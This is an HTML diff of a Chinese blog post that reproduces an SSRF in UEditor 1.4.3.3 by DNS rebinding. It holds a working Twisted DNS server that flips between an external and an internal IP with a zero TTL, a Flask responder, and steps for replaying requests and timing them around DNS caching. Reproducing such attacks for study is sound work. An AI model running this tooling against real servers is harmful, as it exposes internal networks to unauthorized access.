@@ -101,13 +101,78 @@
 <h2 id="0x01-复现过程"><a href="#0x01-复现过程" class="headerlink" title="0x01 复现过程"></a>0x01 复现过程</h2><ol>
 <li>参考文章中先设置test.jianfensec.com的NS记录转发到自己的VPS DNS服务器：<br><a href="http://admintony.com/UEditor-1-4-3-3-SSRF-AND-DNS-rebinding-attack.html" target="_blank" rel="external nofollow noopener noreferrer">http://admintony.com/UEditor-1-4-3-3-SSRF-AND-DNS-rebinding-attack.html</a></li>
 </ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding : utf-8</span></span><br><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line">        <span class="keyword">global</span> flag</span><br><span class="line">        <span class="keyword">if</span> flag &lt; <span class="number">2</span>:</span><br><span class="line">            ip=<span class="string">"47.52.95.35"</span></span><br><span class="line">            flag=flag+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"192.168.123.130"</span></span><br><span class="line">            flag=<span class="number">0</span></span><br><span class="line">        current_time = time.strftime(<span class="string">'%Y.%m.%d %H:%M:%S '</span>,time.localtime(time.time()))</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[&#123;&#125;]&#123;&#125; ===&gt; &#123;&#125;"</span>.format(current_time,name,ip)</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>
+<pre><code class="python">#coding : utf-8
+from twisted.internet import reactor, defer
+from twisted.names import client, dns, error, server
+import time
+flag=0
+
+class DynamicResolver(object):
+
+    def _doDynamicResponse(self, query):
+        name = query.name.name
+        global flag
+        if flag &lt; 2:
+            ip=&quot;47.52.95.35&quot;
+            flag=flag+1
+        else:
+            ip=&quot;192.168.123.130&quot;
+            flag=0
+        current_time = time.strftime(&#39;%Y.%m.%d %H:%M:%S &#39;,time.localtime(time.time()))
+        print &quot;[{}]{} ===&gt; {}&quot;.format(current_time,name,ip)
+
+        answer = dns.RRHeader(
+            name=name,
+            type=dns.A,
+            cls=dns.IN,
+            ttl=0,
+            payload=dns.Record_A(address=b&#39;%s&#39;%ip,ttl=0)
+        )
+        answers = [answer]
+        authority = []
+        additional = []
+        return answers, authority, additional
+
+    def query(self, query, timeout=None):
+        return defer.succeed(self._doDynamicResponse(query))
+
+def main():
+    factory = server.DNSServerFactory(
+        clients=[DynamicResolver(), client.Resolver(resolv=&#39;/etc/resolv.conf&#39;)]
+    )
+
+    protocol = dns.DNSDatagramProtocol(controller=factory)
+    reactor.listenUDP(53, protocol)
+    reactor.run()
 
 
+
+if __name__ == &#39;__main__&#39;:
+    raise SystemExit(main())</code></pre>
 <ol start="2">
 <li>启动Web服务：</li>
 </ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> BaseConverter</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Regex_url</span><span class="params">(BaseConverter)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url_map,*args)</span>:</span></span><br><span class="line">        super(Regex_url,self).__init__(url_map)</span><br><span class="line">        self.regex = args[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.url_map.converters[<span class="string">'re'</span>] = Regex_url</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/&lt;re(".*?"):tmp&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(tmp)</span>:</span></span><br><span class="line">    image = <span class="string">'Test'</span></span><br><span class="line">    <span class="comment">#image = file("demo.jpg")</span></span><br><span class="line">    resp = Response(image, mimetype=<span class="string">"image/jpeg"</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from flask import Flask, Response
+from werkzeug.routing import BaseConverter
+import time
+
+class Regex_url(BaseConverter):
+    def __init__(self,url_map,*args):
+        super(Regex_url,self).__init__(url_map)
+        self.regex = args[0]
+
+app = Flask(__name__)
+app.url_map.converters[&#39;re&#39;] = Regex_url
+
+@app.route(&#39;/&lt;re(&quot;.*?&quot;):tmp&gt;&#39;)
+def test(tmp):
+    image = &#39;Test&#39;
+    #image = file(&quot;demo.jpg&quot;)
+    resp = Response(image, mimetype=&quot;image/jpeg&quot;)
+    return resp
+
+if __name__ == &#39;__main__&#39;:
+    app.run(host=&#39;0.0.0.0&#39;,port=80)</code></pre>
 <p>3.不断重放数据包，尝试绕过验证最终将192.168.123.130:8081的内容写入图片这样就可以得到一个可回显SSRF：<br><img src="/images/2019/11/2849800793.png" alt><br>4.问题出现，DNS rebinding收到缓存和网络影响复现不稳定，重放1000个数据包无效果：<br><img src="/images/2019/11/545939955.png" alt></p>
 <h2 id="0X02-尝试解决"><a href="#0X02-尝试解决" class="headerlink" title="0X02 尝试解决"></a>0X02 尝试解决</h2><p>首先是因为DNS缓存导致的问题，我们无法控制客户端但是可以控制前一个请求的返回时间来延迟客户端处理下一个请求的时间，服务端请求加入time.sleep(45)：</p>
 <p> 1.本地测试DNS缓存释放再请求时间大概为<strong>40-50</strong>秒<br> 2.检查源码中发现使用get_header函数去获取返回信息，此函数未设置超时所以设置延时不会产生异常，实际测试大概60S是极限，如果Burp请求中存在502可以适当降低sleep时间。<br><img src="/images/2019/11/542107569.png" alt><br>在web服务器中加入延迟：<br><img src="/images/2019/11/1256255143.png" alt><br>这里需要改一下原有脚本当flag&lt;2返回SSRF内网目标IP，请求超过2次则返回外网IP，否则服务器一开始就请求外网IP会卡死：<br><img src="/images/2019/11/924749901.png" alt><br>可以发现这里请求了20个包就得到了SSRF内容：<br><img src="/images/2019/11/3036312343.png" alt><br>从服务器图片中获取内网SSRF内容：<br><img src="/images/2019/11/1039293166.png" alt></p>
